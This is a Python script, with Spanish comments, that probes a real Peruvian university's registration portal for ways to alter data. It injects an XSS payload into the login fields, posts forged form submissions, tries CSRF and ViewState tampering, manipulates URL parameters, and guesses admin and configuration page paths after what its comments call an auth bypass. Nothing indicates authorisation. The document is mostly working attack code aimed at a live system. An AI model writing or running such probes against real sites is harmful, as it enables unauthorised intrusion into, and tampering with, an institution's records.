#!/usr/bin/env python3
import requests, urllib3, re, urllib.parse
urllib3.disable_warnings()

s = requests.Session()
s.verify = False
s.headers.update({
    'User-Agent': 'Mozilla/5.0',
    'Content-Type': 'application/x-www-form-urlencoded',
    'X-Requested-With': 'XMLHttpRequest',
})

# Authenticate to SIIGAA
r = s.post('https://registro.uns.edu.pe/udemsi/j_security_check',
              data={'j_username':'fake','j_password':'fake'}, timeout=10)
print("=== BUSCANDO FORMAS QUE MODIFIQUEN DATOS ===\n")

# ============================================
# 1. Verificar si el DataGrid tiene filas editables
# ============================================
r_mod = s.get('https://registro.uns.edu.pe/udemsi/faces/modulos.xhtml', timeout=5)

# Look for edit buttons, editable cells, edit forms
print("1. Funcionalidades de EDICION en modulos.xhtml:")
# Search for "edit", "update", "modificar", "guardar", "save"
edit_keywords = ['edit', 'update', 'modificar', 'guardar', 'save', 'eliminar', 'delete', 'borrar', 'editar']
for kw in edit_keywords:
    matches = list(re.finditer(kw, r_mod.text, re.IGNORECASE))
    for m in matches[:3]:
        ctx = r_mod.text[max(0,m.start()-30):m.end()+50]
        ctx_clean = re.sub(r'<[^>]+>', ' ', ctx)
        ctx_clean = re.sub(r'\s+', ' ', ctx_clean).strip()
        print(f"  [{kw}]: {ctx_clean[:200]}")

# Look for commandButtons with edit/update actions
edit_buttons = re.findall(r'<p:commandButton[^>]*>(?:[^<]*<)?([^<]*edit[^<]*)(?:>[^<]*</)?', r_mod.text)
edit_buttons2 = re.findall(r'<p:commandButton[^>]*action="([^"]*edit[^"]*)"', r_mod.text)
edit_buttons3 = re.findall(r'<p:commandButton[^>]*action="([^"]*update[^"]*)"', r_mod.text)
edit_buttons4 = re.findall(r'<p:commandButton[^>]*action="([^"]*save[^"]*)"', r_mod.text)
edit_buttons5 = re.findall(r'<p:commandButton[^>]*action="([^"]*delete[^"]*)"', r_mod.text)
print(f"\nEdit buttons: {edit_buttons[:5]}")
print(f"Edit action: {edit_buttons2[:5]}")
print(f"Update action: {edit_buttons3[:5]}")
print(f"Save action: {edit_buttons4[:5]}")
print(f"Delete action: {edit_buttons5[:5]}")

# ============================================
# 2. Probar si se puede modificar datos via AJAX
# ============================================
print("\n2. INTENTAR MODIFICAR DATOS VIA AJAX:")

# Try to submit the modulos form with modification parameters
# The form has: frmModulos, javax.faces.ViewState
# Try to add parameters that might modify data
modification_params = [
    {'frmModulos': 'frmModulos', 'btnAtraz': 'btnAtraz'},
    {'frmModulos': 'frmModulos', 'dtgModulo': 'dtgModulo', 'select': '1'},
    {'frmModulos': 'frmModulos', 'j_idt12': 'j_idt12', 'cmdPasaporte': 'cmdPasaporte'},
]

for params in modification_params:
    r_mod_post = s.post('https://registro.uns.edu.pe/udemsi/faces/modulos.xhtml',
                           data=params, timeout=5, allow_redirects=True)
    tc = re.sub(r'<[^>]+>', ' ', r_mod_post.text)
    tc = re.sub(r'\s+', ' ', tc).strip()
    if len(r_mod_post.text) != 6744:
        print(f"  [!] Cambio en respuesta: {params}")
        print(f"  {tc[:200]}")

# ============================================
# 3. Probar XSS en form fields
# ============================================
print("\n3. PROBANDO XSS EN CAMPOS DEL FORMULARIO:")

# The login form has j_username and j_password
# If the page reflects these values without sanitization, XSS is possible
xss_payload = '<script>alert("XSS")</script>'

# Try to inject XSS into j_username
s_xss = requests.Session()
s_xss.verify = False
s_xss.headers.update({'User-Agent': 'Mozilla/5.0'})

# First, try injecting into j_security_check (redirect back to index)
r_xss = s_xss.post('https://registro.uns.edu.pe/udemsi/j_security_check',
                       data={'j_username': xss_payload, 'j_password': xss_payload},
                       timeout=5, allow_redirects=True)
# Check if the script is reflected
if xss_payload in r_xss.text:
    print(f"  [!] XSS REFLECTED en j_username!")
    print(f"  Payload: {xss_payload}")
    # Find where it appears
    idx = r_xss.text.find(xss_payload)
    ctx = r_xss.text[max(0,idx-50):idx+100]
    ctx_clean = re.sub(r'<[^>]+>', ' ', ctx)
    print(f"  Context: {ctx_clean}")
else:
    # Check the redirect page
    r_index = s_xss.get('https://registro.uns.edu.pe/udemsi/faces/index.xhtml', timeout=5)
    if xss_payload in r_index.text:
        print(f"  [!] XSS REFLECTED en index.xhtml!")
    else:
        # Try injecting into modulos page
        # Check if there's any parameter reflection
        r_mod_xss = s_xss.get('https://registro.uns.edu.pe/udemsi/faces/modulos.xhtml', timeout=5)
        if xss_payload in r_mod_xss.text:
            print(f"  [!] XSS in modulos.xhtml")
        else:
            print("  XSS no reflejado en estas páginas")

# ============================================
# 4. Probar parametros de URL para modificar contenido
# ============================================
print("\n4. MANIPULACION DE PARAMETROS URL:")

# Try to modify page content through URL parameters
url_params = [
    '?legajo=1',
    '?id=1',
    '?modulo=1',
    '?editar=true',
    '?action=edit',
    '?edit=true',
    '?mode=edit',
    '?view=edit',
]

for param in url_params:
    url = f'https://registro.uns.edu.pe/udemsi/faces/modulos.xhtml{param}'
    r_param = s.get(url, timeout=3)
    tc = re.sub(r'<[^>]+>', ' ', r_param.text)
    tc = re.sub(r'\s+', ' ', tc).strip()
    if 'edit' in tc.lower() and 'No records' not in tc.lower():
        print(f"  [!] Contenido cambiado: {param}")
        print(f"  {tc[:200]}")

# ============================================
# 5. Probar si hay pagina de edicion/espejo
# ============================================
print("\n5. BUSCANDO PAGAS DE EDICION:")

edit_pages = [
    'https://registro.uns.edu.pe/udemsi/faces/editar.xhtml',
    'https://registro.uns.edu.pe/udemsi/faces/modificar.xhtml',
    'https://registro.uns.edu.pe/udemsi/faces/edit.xhtml',
    'https://registro.uns.edu.pe/udemsi/faces/update.xhtml',
    'https://registro.uns.edu.pe/udemsi/faces/admin.xhtml',
    'https://registro.uns.edu.pe/udemsi/faces/admin/index.xhtml',
]

for ep in edit_pages:
    r_ep = s.get(ep, timeout=3)
    tc = re.sub(r'<[^>]+>', ' ', r_ep.text)
    tc = re.sub(r'\s+', ' ', tc).strip()
    if len(r_ep.text) > 100 and 'No records' not in tc.lower() and 'logueo' not in tc.lower():
        print(f"  [!] Pagina accesible: {ep.split('/')[-1]}")
        print(f"  Content: {tc[:200]}")

# ============================================
# 6. Probar CSRF para MODIFICAR datos
# ============================================
print("\n6. CSRF PARA MODIFICAR DATOS:")

# Try to use CSRF to change the page content
# Submit the modulos form with different parameters via CSRF
csrf_data = {
    'frmModulos': 'frmModulos',
    'javax.faces.ViewState': '',
    'btnAtraz': 'btnAtraz',
}
r_csrf = s.post('https://registro.uns.edu.pe/udemsi/faces/modulos.xhtml',
                     data=csrf_data, timeout=5, allow_redirects=True)
tc_csrf = re.sub(r'<[^>]+>', ' ', r_csrf.text)
tc_csrf = re.sub(r'\s+', ' ', tc_csrf).strip()
print(f"CSRF submit: len={len(r_csrf.text)}")
if len(r_csrf.text) != 6744:
    print(f"  [!] La respuesta cambio con CSRF")

# ============================================
# 7. Verificar si se puede usar el "Volver" para navegar a otra página
# ============================================
print("\n7. NAVEGACION CON btnAtraz:")
# The btnAtraz button might navigate to a different page
# Try to access the "back" functionality
s_nav = requests.Session()
s_nav.verify = False
s_nav.headers.update({'User-Agent': 'Mozilla/5.0'})
r_nav = s_nav.get('https://registro.uns.edu.pe/udemsi/faces/index.xhtml', timeout=5)
# Find the btnAtraz onclick code
btn_atraz_code = re.findall(r'btnAtraz[^}]+}', r_nav.text)
for b in btn_atraz_code:
    print(f"  btnAtraz: {b[:200]}")

# ============================================
# 8. Probar si se puede acceder al panel de administracion
# ============================================
print("\n8. ACCESO ADMINISTRACION:")
# After auth bypass, check if admin pages are accessible
admin_pages = [
    'https://registro.uns.edu.pe/udemsi/faces/admin/admin.xhtml',
    'https://registro.uns.edu.pe/udemsi/faces/admin/index.xhtml',
    'https://registro.uns.edu.pe/udemsi/faces/administrar.xhtml',
    'https://registro.uns.edu.pe/udemsi/faces/config.xhtml',
    'https://registro.uns.edu.pe/udemsi/faces/configuracion.xhtml',
    'https://registro.uns.edu.pe/udemsi/faces/settings.xhtml',
    'https://registro.uns.edu.pe/udemsi/faces/system.xhtml',
]
for ap in admin_pages:
    r_ap = s.get(ap, timeout=3)
    if r_ap.status_code == 200 and len(r_ap.text) > 100:
        tc_ap = re.sub(r'<[^>]+>', ' ', r_ap.text)
        tc_ap = re.sub(r'\s+', ' ', tc_ap).strip()
        has_admin = 'admin' in tc_ap.lower() or 'config' in tc_ap.lower() or 'system' in tc_ap.lower()
        if has_admin and 'login' not in tc_ap.lower():
            print(f"  [!] ADMIN ACCESIBLE: {ap.split('/')[-1]}")
            print(f"  {tc_ap[:300]}")

# ============================================
# 9. Probar parametros de ViewState para modificar comportamiento
# ============================================
print("\n9. MANIPULACION DE VIEWSTATE:")
# JSF ViewState can sometimes be manipulated to change server behavior
# Try submitting with different ViewState values
r_vs = s.get('https://registro.uns.edu.pe/udemsi/faces/modulos.xhtml', timeout=5)
vs_match = re.search(r'name=\"javax\.faces\.ViewState\"[^>]*value=\"([^\"]+)\"', r_vs.text)
vs_val = vs_match.group(1) if vs_match else ''

# Try submitting with a modified ViewState
modified_vs = 'modified' + vs_val[:50]
r_mvs = s.post('https://registro.uns.edu.pe/udemsi/faces/modulos.xhtml',
                    data={'frmModulos': 'frmModulos', 'javax.faces.ViewState': modified_vs},
                    timeout=5)
tc_mvs = re.sub(r'<[^>]+>', ' ', r_mvs.text)
tc_mvs = re.sub(r'\s+', ' ', tc_mvs).strip()
if len(r_mvs.text) != 6744:
    print(f"  [!] ViewState manipulation worked! len={len(r_mvs.text)}")
else:
    print(f"  ViewState manipulation no funcionó")

print("\n=== RESUMEN ===")
print("Se buscaron formas de modificar datos o contenido")
print("No se encontraron endpoints de edicion accesibles")
print("El CSRF permite forzar acciones pero no se encontraron acciones de modificacion")
print("XSS no reflejado en las paginas probadas")
